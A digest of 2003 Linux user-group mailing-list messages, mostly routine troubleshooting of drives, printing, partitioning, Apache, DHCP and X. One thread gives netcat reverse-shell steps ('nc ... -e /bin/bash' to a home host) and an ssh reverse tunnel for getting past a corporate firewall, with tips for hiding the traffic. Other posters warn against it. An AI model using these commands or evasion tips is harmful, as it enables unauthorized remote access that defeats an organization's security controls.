is short and steep but it is better than lifting a heavy item 3+ vertical
feet.

Subject: [PLUG] Re: Promise drive controller
Message-ID: <20031224224550.GA18304@gate.kl-ic.com>

I have two Promise Ultra133 TX2 drive controllers, in two Linux systems,
with two different kinds of motherboards.  

On one system, there are two big drives on the controller, /dev/hde and
/dev/hdg.   Two CDRs are plugged into the IDE slots.  Everything works
just fine.

On the other system, I find that I cannot put more than one hard drive
in the system without the kernel getting confused - at boot time, it
picks files off of both drives and panics.  I can only have one IDE
hard drive on that system.  After some dinking around, it seems to 
be due to the motherboard - an ASUS P4T-E .  I can run a second drive
off a USB2 controller.

Bottom line is, your motherboard may be the culprit.  It may not work
nicely with a second IDE controller with multiple drives.

All,

Fetchmail is producing:

Server CommonName mismatch localhost.localdomain != server.domain.network

localhost.localdomain is set to 127.0.0.1
server.domain.network is set to 10.0.0.2

These are correct and are set in /etc/hosts

Is this a fetchmail issue or somewhere else?

How can it be resolved??

FYI in case you decide to install more Debian systems if you type bf24
at the boot prompt in the installer you will get 2.4.18 as your default
kernel.  It is still wise to update to at least 2.4.23 due to the recent
kernel exploit.

I too have an ASUS motherboard. Performance seems to
be satisfactory now, so you might keep in mind that
SuSE allows multiple tries to install packages.

Are they the same machine? I.e., is 10.0.0.2 an ethernet interface on

Computer A is running sshd and is behind a firewall that blocks all

Is it possible for A to create a tunnel to B and then for the user at B to

I figured it out for anyone who's interested...  Nothing's encrypted yet,
although cryptcat (http://sourceforge.net/projects/cryptcat/) should do it
for me as soon as I figure out how to compile it on my RH 9 box.

Step 1: Download and extract netcat:
http://freshmeat.net/redir/netcat/7041/url_tgz/nc110.tgz

Step 2: Add "#include resolv.h" to netcat.c if you want it to successfully
compile on Linux.

Step 3: make linux DFLAGS=-DGAPING_SECURITY_HOLE

Step 4: Start netcat listening on your home box:
$ nc -l -p 80

Step 5: Start netcat on the box behind the firewall:
$ nc yourcomputer.tld 80 -e /bin/bash

Step 6: On your home box, start typing shell commands that are executed on
the box behind the firewall.

ssh can be used:

ssh -f -N username at host_B -R22000:localhost:22 


Then, on B:

ssh -p 22000 user_on_a at localhost

 No, I'm just an embedded hardware guy trying to master the software 
side as well. I can program 8-bit micros with the best of them, but I 
see them becoming irrelevent in the near future just as 4-bitter have. 
16-bitter have never really been much of more than a nitch product, and 
probably always will be. So you could say I'm trying to get ahead of the 
wave. I'm trying to find the brains that I'll pick once I finish my 
reading list.

 Here's how I see the future of embedded processing unfolding: As 32-bit 
micros get more and more embedded memory, it will eventually become 
practial to ship them with an OS on chip and it won't be windows. As an 
example take the last 32-bit design that I did. It was a 5272 coldfire 
with 8MB of FLASH, 8MB of SDRAM, and an ethnet PHY on a 72-pin SO-DIMM. 
Motorola recently released the 5282 with 512KB FLASH, and 64KB DRAM. 
This isn't enough for Linux, but you could get by with as little as 2MB 
of FLASH (or less if you ROM the OS and use FLASH only for the user file 
system). If you use stacked die packaging and use an 8MB SDRAM you have 
a viable system on a chip with today's technology. I don't see this 
happening today, but it will happen eventually. And it may even happen 
for a reason other than the desire of chip makers to have the chip with 
the most stuff on it: it would mean that you no longer have to port an 
entire OS to your target. You can skip straigth to the step where you 
start developing the custom drive code for whatever is off-chip (if any) 
or the application code itself.

 I could ramble some more, but I figure this crowd gets the point...

Subject: [PLUG] setting env vars before init scripts run??
Message-ID: <3FEDBFC6.8030908@pobox.com>

I have created an init script for tomcat on my local web server.  But it 
needs two environment variables in order to start up.  I had set and 
exported these variables in /etc/profile, but apparently /etc/profile 
does not get called until after the init scripts run.  So I moved them 
into my tomcat init script and exported them from there.  Now the tomcat 
init script starts up just fine, but the environment variables no longer 
get exported system-wide when I export them from the script, and I need 
at least one of them for other programs running on the system.  The only 
file I know to export environment variable to the whole system is 
/etc/profile.  Is there another file that exports them before the init 
scripts are run?  I could always set them in the tomcat init script and 
also export them from /etc/profile, but that means maintaining them in 
two files.  Is there a conventional way for dealing with this situation?

My init script is /etc/rc.d/init.d/tomcat and is linked to 
/etc/rc.d/rc5.d/S71tomcat.

/etc/profile is only used for login sessions and only for certain shells. 
The system in general won't see what's in there.

You probably want to set your vars in /etc/rc.d/rc.sysinit
But keeping them in /init.d/tomcat is cleaner.

Better yet, create /etc/sysconfig/tomcat and from /etc/rc.d/init.d/tomcat do 
something like,

[ -e /etc/sysconfig/tomcat ] && . /etc/sysconfig/tomcat

which says if tomcat exists, source it

Then add the same line in /etc/profile

This way you only need to maintain the one file.

Can you please be careful in doing this? In many companies,
if you are caught, you can get into trouble.

Where I used to work, they monitored all of the network traffic
using sniffers on the firewall's lan. IT Secuirty was very suspicious
of traffic that they cannot identify or justify. I knew of one person
who did get fired for trying to do something like this.

Subject: [PLUG] (Re)-Partitioning
Message-ID: <3FEDD9C1.9070700@adnap.no-ip.com>

On my new Debian system, I installed without partitioning (everything 
except /boot is in one big root partition).  This machine will be a 
server (no X, usually no keyboard or monitor).  I have heard that having 
different partitions is a good idea, but I never really understood why.

Why would one partition a hard drive, and what is the best way to go 
about it?  If repartitioning is the way to go, how can I get my hands on 
a parted boot disk or comparable utility?  ftp.gnu.org has nothing but 
placeholders stating that things will return Real Soon Now (RSN).  It 
has been in this state since at least Nov. 1st.

Thanks,
Evan

Isolation is one good reason (not to say that it's the only good 
reason). In your current configuration it would be feasible to imagine a 
run-away ELF logging errors at a rate that would fill the root file 
system in a matter of hours. This would at least make your life 
interesting for a short period of time if not bring the box completely 
to it's knees. All of this could be avoided by creating a /var file 
system on a partition separate from /.

Another benefit of isolation is the flexibility to use different file 
systems depending on need. Something like ext2 for access performance on 
/ and /boot, ext3 or reiser for speed of recovery on /opt /home and 
/var, <swap> for the swap partition. This of course is not an option 
with one single partition.

If your going to live in the world of Linux forever then the practice of 
running on a single partition is possible (although not advisable in 
most instances). On the other hand if you get into an enterprise that 
uses hpux, aix, omvs or solaris (just to name a few) you are going to 
have to get used to mounting partitions other than /.

As far as the best way to go about change, that depends on your 
available resources and the expectation placed on this installation. If 
nobody is going to get cranky because the installation is delayed then 
you might want to nuke the install and start over. If you have a volume 
of unused space and no time to redo the install you can re-partition and 
remount file systems as you see fit.

Happy Holidays!

That's about what the situation is. What I'm looking for is exactly how 
to repartition: what tool(s) should I use?  GNU parted looks good, but 
the bootdisk and rootdisk are nowhere to be found.

Not that I want to soften this warning, but if they're sniffing, all
they see is a normal outbound ssh connection, encrypted tighter than
the NSA would like you to have for home use.  If they are intercepting
the SSH packets and performing a "man-in-the-middle" attack, you'll
know (if you're using ssh2 and not 1) that "the host key has changed",
informing you that something is insecure.

SSH does what it is designed to do.

At my wife's request :-) I'm clearing old and/or unwanted books from
the shelves in our office. They're free for the asking, though you'll
have to make some sort of arrangement for pickup, since I'm not going
to mail them anywhere:

* Learning Perl by Randal L. Schwartz, 1993

  This is a fine book, but this edition is a bit outdated, since it
  was released before Perl 5. I really ought to thank Randal, because
  I spent hours reading and rereading it, learning gobs in the
  process.

* Linux Configuration and Installation (2nd ed.) by Patrick
  Volkerding et al., 1996.

  Outdated, too, is this book -- but it includes Slackware 96 on
  CD-ROM. It hearkens back to a day when you had to roll XF86Config by
  hand.

* Using Oracle8/8i by William Page, Jr., 1999.

  It's got Oracle for Linux/x86 on CD!

* Linux System Administration by Marcel Gagne, 2002.
* The Linux Companion for Systems Administrator (2nd ed.) by Jochen
  Hein, 2001.
* Multitool Linux by Michael Schwarz et al., 2002.

  These three books are all review copies sent to me by Addison
  Wesley, but I wasn't able to spend much time with them.

I think it would be more a matter of timing, if I saw lots of ssh
traffic coming from a workstation with no driver, I would be suspicious.

Your company should have some sort of acceptable access policy, just
check with the IT dept., they should be able to tell you if that form of
access is acceptable.

Good Luck,

This is probably the best advise yet. I would imagine that when someone 
notices log entries that show after hours response traffic to an 
internal machine from the Internet they will at least kill external 
access for that host and question someone about it.

I know that's how I would start.

Subject: [PLUG] CUPS problem
Message-ID: <980D94EE-38BF-11D8-B99E-0030656C7440@mac.com>

Hello,
For Christmas, I received an Epson Stylus Photo 825.  I really would 
like to get it networked via cups for my home network to make use of.  
My problem is that I can't get it to print, even though I installed 
everything I'm supposed to.  There is no weirdness in the error log 
either, just a printer that won't print.

Here's what I installed:
Cups 1.1.20
Ghostscript (off cups.org)
Gimp Print (latest version off their site)
All Graphics libraries (jpeg, tiff, png, zlib)
Foomatic

I also made sure that USB was compiled into my kernel.  It's compiled 
as a module, and when I type "lsmod" usbcore and usb-ohci appear.

I used CUPS web interface to add my printer, and it says that  it's 
ready, but when I click "print test page" nothing happends, it just 
sits there.

I'm completely lost and could definitely use some suggestions.

Thanks,
Robert

hey there. this is my first post to the list and I would love to take off your 
hands "Linux System Administration"

I am a new bee and just installed my first linux distro. :)

so far I am very pleased with it. It is a bit complicated but there are a ton 
of eBooks online that are very helpful. I am trying to learn to do as much as
possible from the command line.  

Anyway if the book is still availible then I would love to have it.

  In addition to making /var a separate partition, there are advantages to
having a separate /tmp (when it gets full it doesn't fill your entire
drive), /home (so it doesn't get overwritten during upgrades), /usr/local
and /opt for the same reasons.

How do you tell "no driver" automatically and remotely?

Again, I'm not trying to reduce the impact of the original caution.
After all, I became a felon for something similar.

I'm just trying to point out the futility of detecting that an
outbound ssh connection is also being used for inbound access.
Technically, that would be impossible to detect and/or filter, because
the pipe is opaque.

But beware what happened to me, where the chalk lines get moved after

I need some Apache help. I'm migrating a directory to a VirtualHost. 
e.g.

   Old and busted: http://fallendevil.com/cal/
   New hotness: http://cal.fallendevil.com/

These redirects both work:

   http://fallendevil.com/cal/ -> http://cal.fallendevil.com/
   http://fallendevil.com/week.php -> http://cal.fallendevil.com/week.php

There are several redirects that don't work. Try clicking any of the 
links on http://fallendevil.com/broke.html and you'll see'll what I 
mean. Maybe there's a trailing slash problem here...

Here's a weird thing: almost every redirected link *prints* the correct 
URL in the browser location bar, but doesn't *go* there. I've watched 
the logs; only some of the broken URL's hit the server.

pertinent httpd.conf sections:

	BindAddress *
	NameVirtualHost *

	# Default
	<VirtualHost *>
	    ServerName fallendevil.com
	    ServerAlias www.fallendevil.com keroes.com www.keroes.com
	    DocumentRoot /var/www/html
	    RedirectPermanent /cal http://cal.fallendevil.com
	</VirtualHost>
	
	# Calendar
	<VirtualHost *>
	    ServerName cal.fallendevil.com
	    DocumentRoot /var/www/html/cal
	</VirtualHost>


Any ideas?

Subject: [PLUG] Rio Karma linux support
Message-ID: <20031227185820.1a7dbc1c.russell-evans@qwest.net>

I received a Rio Karma for Christmas. Ogg support as well as
Linux support were what I was looking for. The Ethernet port and flac
support are definitely great reasons also. The price we got was 284.44,
free shipping, and $20 mail in rebate, final cost $264.44.

The reason for this post is that after hooking it into my network I was
disappointed to find that it wouldn't pick up a lease. The other hosts
I have on the network work fine so I was worried. 

I have found a few posts on the ogg mailing list where people returned
the karma for this reason, and no posts on how to overcome this. So I
thought I would post what I determined was the issue with my setup.

My dhcp server is ISC dhcp v3.0.1. Looking at the packets with Ethereal,
I saw the karma was looking for the broadcast-address option that I
didn't have set. After setting this, I still had issues. I thought it
might be link negotiation after getting it to talk to a laptop via a
static address and crossover cable.  The issue however is
that allow bootp; must also be set

Once getting it to accept a lease from a range, I wanted to set DHCP to
provide the same lease to the karma so I could connect to it without
having to determine what lease it had. The karma does have a user
interface that will give you information about the current lease, but if
you are in the configuration when you are attempting to connect with the
java application, you get an error and have to restart the application
to try to reconnect. You also need to make sure you configure a password
first or the java app will fail to connect and you'll have to restart it
again.

In playing around with the host settings in dhcp, I found that;

    hardware ethernet xx:xx:xx:xx:xx:xx;
    fixed-address xxx.xxx.xxx.xxx;
    option broadcast-address xxx.xxx.xx.xxx;
    option routers xxx.xxx.xxx.xxx;
 
are required and only they can be set. Any other options in the host
setup will cause the karma not to accept a lease.

The java application works well for me. I can see how someone with more
advanced usage might find it limiting but it does what I want.

I use this to make starting the app easy for me

#/bin/sh
#

JAR=$HOME/.rio/rmmlite.jar
java -jar $JAR
exit 0

As rmmlite.jar is carried by the karma and can be downloaded from it via
most web browers, any computer with java installed and an Ethernet port,
should be able to connect to the karma. To me this makes the karma very
portable even it you can't connect to it via a network file system, or
as a usb mass storage device. 

Even if the network's dhcp server doesn't work with the karma, I'm
assuming a lot of commercial SOHO firewalls/routers don't do bootp,  you
can set it up with a static address to get access. Interestingly; the
Ethernet cable supplied with the Karma is a straight-through, not a
crossover cable, so you'll need a switch or hub to plug into. I would
think one system with modem or broadband connections are the norm, and a
crossover cable would make more sense in the package. Or, maybe they
are thinking a one system setup will use the usb connection?

Thank you
Russell

I know everyone hates "works for me" emails, but all those links do work 
for me. Every link got me to cal.*/week.php.  Maybe it's a browser 
problem.  I tried Mozilla 1.5 on Windows.

If you're checking the log, my IP address starts with 63.170.21*.

At least it's not a Lexmark USB printer, then you'd have such a pretty 
paperweight. First step is what does /var/log/cups say? Be sure your 
'LogLevel' in cupsd.conf is 'debug'. 

Are you trying to print over the network, or locally?

One thing I've been seeing lately is that some ethernet devices, in this 
case a 24 port Dlink switch, can flip the port automatically if it senses 
that the far end TX/RX are not setup correctly.  Thereby eliminating the 
need for crossover cables.  I would expect hardware vendors to include 
this capability in their ASIC and software designs.  Hopefully anyway.

I like to have /tmp mounts as a tmpfs memory-backed filesystem; it makes
some operations faster and a reboot cleans it out.  At one point, I
foolishly made /tmp a RAID0 filesystem (where all my other filesystems
were RAID1) and I had unnecessary downtime because one drive failed and
the system would not fully boot because the /tmp RAID device couldn't be
mounted correctly.  I can't see much use in making /tmp RAID1, so using
tmpfs is the best option.

These generally aren't touched during upgrades, but having them separate
would certainly make it easier to completely change distributions with
fewer problems.

Now that I've discovered that the on-disk format of LVM1 is going to be
compatible with the 2.6+ kernels, I use that for everything except root,
boot and swap, to avoid having to commit excess disk space before I have
any idea of how it's going to be used.  And for swap, I create a swap
partition on every disk and use the 'pri' option with the same priority
so swapping is load-balanced over all the drives.

Ditto with /var/run. If you've got the memory, it's really cool to
have a tmpfs directory for doing your compiling. It can speed up
builds fairly substantially.

/var/run might not be such a good option, although I admit that I
haven't tried it.  Some subsystems will want a subdirectory with
appropriate ownership and not create them automatically.  I note that
several packages own these sub-directories, which probably makes them a
bad option for tmpfs.

'tmpfs' is a filesystem in 2.4 kernels.  Here's what my fstab has:

none /tmp tmpfs defaults 0 0

By default, it's half the size of physical memory and is pageable.  See
the man page for 'mount' for more options.

Ok.  I figured out one of my problems.  I had to also load the 
"printer" module to get the printer to print.  Now I'm stuck at a 
different step.  When I type "lpr test.jpg", it will print just fine, 
but still nothing happens when I click the "print test page" button.  
The printer now claims "ready to print", but it continues to sit there 
unless I type at the command line.

Also, how do I access a shared printer via samba?

Thanks,
Robert

Ah, USB, do you have hotplug installed?  I haven't messed with a USB
printer yet, but there is a module called "printer" in my
/lib/modules/2.4.22/kernel/drivers/usb/ directory.  If you change to a
console, and plug in your printer, it should show the device
registration (a message will also be sent to syslog), and if hotplug is
running it will try to load the module.

Otherwise, try "modprobe printer" as root; no message is a good thing :)

If the device isn't being registered, you have some sort of hardware
problem, or the wrong usb drivers.

Yep, sounds like the drivers aren't loaded, or a link needs to be
created from the device that CUPS is using to the actual usb device.

I still think that you would be better off informing your companies IT

Thanks to everyone!  I managed to get my hands on parted and a bootdisk 
and now have new partitions waiting to become /tmp, /var, /usr, and 
/home.  I am now looking at how to copy all the files in the current 
/var, /usr, and /home to their new partitions.  I tried cp, but that 
destroys all the permissions and ownerships.  I can restore these by

tar or rsync, I would guess are the common answers these days.

cd /old/var
tar cBf - * | (cd /new/var; tar xvpBf -)

Season to taste.

Since I'm the sys/net admin this was more a proof of concept for my own

Maybe if the destination port is port 80 then it would be less suspicious,
like some nightly software update to up2date or windowsupdate, etc.

I've been using the familiar up2date, but that system seems overtaxed,

There are other ways to update fedora, how do you do it? (not including

Thanks for giving me another set of eyes or three. It does, indeed work

Do not beard the lion in his den, even if you are right.  Embarrass the
security or admin idi^Wpeople and they can come done on you like a ton
of bricks, the more incompetent they are the harder they will try to

it should be fairly straight-forward to write a Perl script using LWP (or
use curl or wget) to pull down the list, do some comparisons with the
files currently installed on your system, and then download and install
the necessary rpms.  Actually, I think I'll write this now for my own use

  Best to make /usr/local separate, not all of /usr. The latter will be
overwritten during upgrades, the former will not.

  Perhaps 'tar'? I've never tried to copy from one filesystem to another
with the same name.

Doh!  Yet another possible opportunity to improve my programming prowess
has been snatched from my grasp!  Ah well, back to my mundane admin
duties...

Why not apt-get?  You know it's available for RPM repositories, don't
you?  I use a mixture of apt and yum; my own repositories are only
apt-enabled (because I've been too lazy to figure out how to yum-enable
them), but for updates (where I don't have a local mirror) I use yum.

Hi Dan,

Last time I talked with Paul, he said there would be no clinic this 
month. Has other plans been made or is it a mistake??

Take a look at rsync. Although I don't use it in that capacity I hear 
that it's pretty good at making local mirrors.

Two weeks ago I bought an IOGear GPSU01 USB print server from Compusa
for $50 to solve the very same problem. Although I haven't tried it yet,
a Google search on +iogear +linux +"print server" or something similar
turned up enough hits to make me think it will work.  Apparently it's
almost? identical to a Hawking print server. Last week CompUSA (if I
remember correctly) had the Linksys USB print server on sale for about
$50 after rebate.

I saw a linksys parallel print server & router on pdxforsale.com last
Thursday.  It's near the top of this page:
http://www.pdxforsale.com/?day=12-18-2003
Don't know if it's still available.

If you buy one, let us know how it works for you!

I'm going to hold out getting one until they're under 500 lbs.  Then
I'll put it in my car - talk about portable computing!

cp -a preserve permissions and ownership, so does tar:
cd /usr; tar cf - . | ( cd /new/usr; tar xf - )

You could randomly change ports, and really confuse 'em.

Yes.  Use some iptables magic to redirect port 22 on the outside

IIRC, yum is installed by default on Fedora Core 1.  Should be as simple 
as

		yum update

Hello,
I was wondering if there is a way to improve the formatting of documents
printed through CUPS. I noticed especially with embedded Excel 
spreadsheets
that they do not line up correctly.  I also noticed that some of the 
fonts
printed weird.  I installed Ghostscript and Gimp-Print, but maybe I need
something else?

Thanks in Advance,
Robert

It really doesn't matter much anyway. Recent changes in IS structure for 
most corporation have moved security functions to dedicated Corporate 
Security groups where "trained professionals" can monitor and police the 
network. This is the group that should know when a host is supposed to 
be active and when it's supposed to be idle so any traffic that occurs 
during the idle period is suspect and worthy of investigation. When 
suspect traffic is detected, regardless of the destination or source 
ports, then managers are contacted, additional monitors are put into 
place and the blade starts to fall.

It's never a good idea to circumvent security policy if you're 
interested in keeping your job and keeping yourself out of the court 
systems. If you can't live with your companies policies you should 
probably look at changing companies or getting the policy changed.

perl -e 'printf ("%02X%02X%02X%02X\n",10,0,0,19);

0A000013


What I want is to put this into a script, so I don't have to remember
the format string. This is what I came up with: 

#!/usr/bin/perl -w 
#

foreach $IP (@ARGV) {
 print "$IP\t";
 @IP = split(/\./, $IP);
 printf ("%02X%02X%02X%02X\n",$IP[0],$IP[1],$IP[2],$IP[3]);
}
exit 0

This is the first time I have done anything in perl so what some feed
back. I know I want to test @ARGV for format but haven't gotten that
far. My real reason for asking is I wanted to do 

foreach $IP (@ARGV) {
 print "$IP\t";
 $IP =~ s/./,/g;
 printf ("%02X%02X%02X%02X\n",$IP);
}

but that has issues. So is there a better, more correct, way to do this?
Would:

#!/usr/bin/perl -w 
#

foreach $IP (@ARGV) {
 print "$IP\t";
 @OCT = split(/\./, $IP);
 printf ("%02X%02X%02X%02X\n",$OCT[0],$OCT[1],$OCT[2],$OCT[3]);
}

be considered a better form if this is a good way to do it?

Thank you

If you are using GNU tar (if on linux, you almost certainly are), then
you can use its whiz-bang features, e.g.:

  tar -C /usr -cl . | tar -C /new/usr -xpv

a) the -C option changes the effective current-working-directory for
   its associated instance of tar.

also:

b) I used the -l option on the left side to limit to one filesystem.

c) I left off the -f option on both sides because stdout/stdin are the
   defaults.

d) I added the redundant -p out the right side just for emphasis.  It
   is on by default when run by root.

What are you trying to do in the next two lines?

Well, like perl people say, there's more than one way to do it... Your
final example seems fine,  the only changes that spring to mind would be
something like this:

#!/usr/bin/perl -w
#
use strict;
while (my $IP = shift) {
  print "$IP\t";
  printf ("%02X%02X%02X%02X\n",split(/\./, $IP));
}

This remonds me of something that I had heard one evening from
a colleague of mine recently.

They worked at a firm where you had to badge in and badge out.
Sure, you can get out without badging, but, unless it was a fire
or other emergency, a security camera would take a picture of you
as you open the door without badging. The system would record your
picture, the room you just left, and the date/time.

As you badge in (swipe badge in reader) and badge out, you are
recorded in a log. The log had date, time, room/building, and
employee id.

They fed this log into a simple dbms database.

All of the servers' names, IP addresses, and mac addresses
are in yet another dbms database that also included employee
name and id for the person(s) who was responsible for it.

The desktops were on a DHCP based system. The same dbms database that
had the name and addresses for the servers also has mac address, system
id, and employee name/id for all of the desktop systems. As each
desktop system is turned on in the morning and gets its assigned
IP address, that information is entered into the dbms database. When
they turn off their system to leave for the day, the IP address is
then removed from the database and the system is marked as off line.

There was a system that 'ping' ed each active DHCP assigned IP address
periodicaly (every half hour or whatever). If no response; the IP
is marked available and taken out of the database.

The database had a fairly accurate snapshot of whos' systems are
on at any given time.

The firewalls, which were 'owned' by corporate security (and kept
in a separate double locked computer room in the data center) were
used to monitor network traffic.

The sniffers were said to be (they had no means of verifying)
modified so that if they notice traffic from one or more IP's
for over a certain time, as well as certain times during off hours
for a particular IP subnet, they would query the dbms database to
retrieve the mac address, and responsible employee contact information
for that system. Now, with the employee ID, the modified sniffer
scripts/software can access the facility entry/exit log dbms
database to determine if that employee is in fact in the facility
or had badged out.

If the person has badged out and their computer is still engaged
in traffic, and it's a desktop and not a server; then someone just
may ask a few questions to that employee the next morning.

If suspicious traffic is noted from a server; that server's system
admin contact is available. Security can easily go to management
and ask if Mark's sales prospect database server had any reason to
be maintaining an eight hour ssh session with phreak.hack.home.net
especialy when there are no active trouble tickets on the system during
that time.

If you want to keep using the graphical interface, up2date now supports 
yum and apt repositories.  Where up2date looks is controlled by 
/etc/sysconfig/rhn/sources.  The default file has examples for the 
different types.

I may never use the CUPS Web interface, and there are
arguments for not doing so (security, mainly). What
surprised me, however, was that, although I installed
the system myself, I could not log into it! Apparently
root/password won't do it, as they will for Webmin.
Does anyone know the defaults for these values in CUPS?

Mine works with hotplug, I think it loads a module called "usb-storage"
(try "modprobe usb-storage" if you're not running hotplug), then maps to
the next available scsi drive , which depends on your system, but is
probably /dev/sda, and already has a partition (FAT), so you could
"mount /dev/sda1 /mnt" or something like that.

Good Luck,

Tim,

  When I first installed CUPS a few years ago I could not get the printers
properly identified and working using the command line. The Web interface
worked. I never found out why this was so, but I read some messages that
others experienced this same, perplexing situation.

  That written, I recently discovered that to make the BUI work, I needed to
both log in as root (with root's password, of course) and specify 'admin',
too. That is, rather than typing the URL, 'http://localhost:631', I needed
'http://localhost:631/admin'. That has worked for me each time.

HTH,

Rich

Yes, I run a kernel build test and automatic update procedure at night.
:)  Being a software developer one can come up with all sorts of excuses
for ones desktop machine to be running all night doing stuff.  That said
I'd not run an illegal tunnel in an environment that paranoid with out

Where do I set the keyboard lock?

So, for example, if there are no keystrokes for five minutes
the screen saver comes on and you need a password to use the
computer?

  If you're using Xfce, try putting this:

xscreensaver -no-splash -lock-mode &

  in xinitrc.

Thanks to everybody for the advice. Took very little thrashing, all
things considered.

Derek's hint that it would be treated as a SCSI device got me to fire
off ls /dev/sda* which gave:

/dev/sda@  /dev/sda2@  /dev/sda5@

I tried to mount each in turn to a directory I had created under /mnt
and got happy with:

mount /dev/sda5 /mnt/usbfs

I then added this line to /etc/fstab

/dev/sda5  /mnt/usbfs vfat   defaults,user,auto,rw 0 0

And everything seems to work right.

Again, thanks to Derek, AthlonRob, and Marvin for responding!

-Ron

I am using "icewm"

So I put it in .Xresources.

I'm not sure how I got to this site last night, but most of the links to
rebate deals work. 

If you don't mind doing mail in rebates, then this site has rebates from
all over. I think the posts are by people finding them, then posting the
information to the site. Some of the posts are in store deals or
estore deals, i.e. $5 or $10 coupon codes for half.com. 

http://www.dealdaemon.com/

Most of the current posts are good till Wed Dec 31 2003, with rebates
posted by Jan 14 2004.  

Thank you
Russell

I had this issue on a series of RH8->RH9 machines.  Mozilla was printing
a error in the bottom status bar.

Un-installing and reinstalling *all* mozilla packages fixed it.

I would also get a bunch of "cannot authenticate" messages and whatnot.

This alone is one of the issues that keeps usb/firewire from being plug
and play.

I think distros should either create  /mnt/usb[0-9] or better hotplug
create a default location for each device.

I just installed a camera on my wife's RH9.  I had already done "mkdir
/mnt/flash" and gnome (XD2) has a nice feature to right click, Drives,
Flash, and presto the "drive" appeared on the desktop.

I wish it were a bit easier.  Really if a usb device is plugged in,
nautilus (or equiv) should be able to do something so the user can see
the device.

Check out the devlabel project, which aims to provide exactly this kind

Message-ID: <3839.68.108.203.223.1072751889.squirrel@webmail.pdxlug.org>

I have a crossover cable connecting my laptop's ethernet port to the port
on my Netgear ME102 wireless access point.  I also have a Linksys wireless
router that connects to my cable modem.  Is it possible for the AP to
function as a glorified wireless network card and talk to my router?  I've
set all the standard stuff to be the same on the AP as it is on the router
like ESSID, WEP, shared, etc.  My laptop that is directly connected can
ping the AP (why a wireless bridge would even need an IP, I have no idea),
but I can't ping beyond the AP.  Other hosts on my wireless network can't
ping the AP.
Is there anything special that I'm missing that needs to be done to make
an AP talk to a wireless router?
Thanks,
~M

If you have a wireless router, you have two access points.  If I
remember right you have to have them in "bridging mode" to make them
talk.

Message-ID: <1072761022.3194.35.camel@griffin>

A friend is an independent paralegal and one of the attorneys she works
for wants her to work remotely on his Windows 2003 Server using Windows
Terminal Server and Sharepoint.  She doesn't want to have to upgrade to
XP because she only runs Windows 98 for his work (and doesn't trust XP).

She runs Linux (Mandrake 9.1 I believe) and a Mac notebook running OS/X.

Is there a way she can access Windows Terminal Server from Linux (or the
Mac, if not Linux)?  How can she use Sharepoint from Linux (or Mac), if
that's more complicated than just using some browser (IE, Mozilla etc.)?

I told her that I'd inquire for her here on the PLUG-list.  She's pretty
sharp, but wanted me to be sure to ask for help "a girl can understand".

Any help appreciated,
Robert Munro

Use rdesktop on Linux or Mac OS X, http://www.rdesktop.org/ 
rdesktop is way cool.

Ooh, ooh. I know this one!

rdesktop supports the protocol used by WTS --
http://www.rdesktop.org/

Likewise tsclient for gnome lovers --
http://www.gnomepro.com/tsclient/

Dunno Sharepoint much.

Subject: [PLUG] where does Red Hat start x?
Message-ID: <200312292153.16117.carla@bratgrrl.com>

Ok Red Hat deities, I'm trying to figure out where RH starts X in runlevel 5. 
I've pored over scripts and followed symlinks in endless circles, to no 
avail. rc3.d and rd5.d look exactly the same. 

The bigger question I'm looking to answer is How To Stop an X Session. 
Changing runlevels seems rather drastic simply to stop a single service. Yes 
I know about

- ctrl- alt- bksp, which does no good if gdm is enabled, and is kind of a 
harsh thing to do anyway
- boot to runlevel 3, then use startx, so that logging out of X drops back to 
a text console

By 'X session' I mean any window manager or desktop. 

Thanks!

Did you check inittab to see what it does?  Maybe it calls a separate
script there or something?

Try /etc/inittab, iirc.

Not sure, sorry. Appeal to actual redhat deities, not poseur
debianites masquerading as such. :-)

I just remembered I have access to a RH 8.0 box...

So I guess that's the ticket...

in RH 7.3 (at least) look at /etc/inittab

# Run xdm in runlevel 5
# xdm is now a separate service
x:5:respawn:/etc/X11/prefdm -nodaemon

I haven't tested this...but try commenting out the last line there.

Yeah, that's my problem. A funny thing happened when I switched my main 
workstation from Red Hat to Debian. All the Red Hat knowledge got deleted to 
make room. Shoulda upgraded my storage, I guess.

...which will work, but it seems one should be able to change the
runlevel the system settles into. For example, Debian uses 2.

Oh well.

As other people pointed out, it's the prefdm line in /etc/inittab.  If
you don't want X to start, change the first non-comment line in the
inittab so the default runlevel is 3 instead of 5:

From:
id:5:initdefault:

To:
id:3:initdefault:

To make it effective immediately (or temporarily, w/o editing inittab),
from a shell as root run 'telinit 3'.

Message-ID: <20031230072539.69230.qmail@web9610.mail.yahoo.com>

This may not be everyone's favorite topic, but imagine
how little help I could expect to get from the other
camp. I'm now booting Linux from a floppy, but there
may be more satisfactory ways to do it. Presumably the
first thing to do is to copy GRUB to the Linux boot
partition.

Windows XP has a built-in boot selector, but it was
intended (of course) only to boot other Windows
installations. So then we copy some code from the
Linux boot partition in this wise:

dd if=/dev/hdb2 of=/bootsect.lnx bs=512 count=1

Move this code to the Windows c:\ drive.

Add a line at the end of boot.ini:

c:\bootsect.lnx="Linux"

Now when the system is powered up, both OS should
appear in a menu and you can select the one you want
to start.

Have I missed somethimg? Probably there have been some
people on this list who have done this. "...And
Mormons don't recognize each other at a liquor store."

  I think you'd have major problems if you don't specify a default runlevel.
Of course, I could be completely wrong, but that's because I've never tried
doing such. My fiancee's laptop fires up with kdm, but all other machines
begin in runlevel 3.

ok sorry for my incopidence but I am having problems with my PC. There was a topic a couple days ago about a very nice fellow that had some books to give away.

I clamed one of them at the time and then my computer crashed. I was using an email client that erases the email from the server when it fetches them. I had to reinstall my OS and becouse of my newbee statis I erased all the emails I had downloaded from my server. 

I still hope to be able to collect on the book but I need some information. Such as how to get ahold of the person that is offering the books?

If anyone could give me a clue I would very much apresate it. ;)

That was me. You asked for my copy of "Linux System Administration" by
Marcel Gagne (2002). It's still yours for the taking. You'll need to
get to Gladstone or the Tanasbourne area to pick it up.

  I _like_ that book! It gave me a different perspective on a number of
topics that made them much clearer to me.

Subject: [PLUG] Email greeting cards
Message-ID: <20031230172435.GC9387@gate.kl-ic.com>

A week ago, I got an "email greeting card" from my swedish cousin
Dan for 123greetings.com .  I don't know whether it was really
from him, but I have learned that 123greetings.com is a front for
spammers and that accesses to their website is construed as an
"opt in" and a verification of the email address.

I assume you know about this.  Don't ever, ever look at
"123greetings.com" cards sent by well-meaning but uninformed 
friends.

In fact, most html email (the kind that accesses images from web
sites) can be used to gather information about you.  For example,
the address:

 http www DOT 123greetings DOT com SLASH view SLASH CW112203593404

... has CW112203593404 at the end, which is used by the spammer's
server to identify exactly which email address the "greeting card"
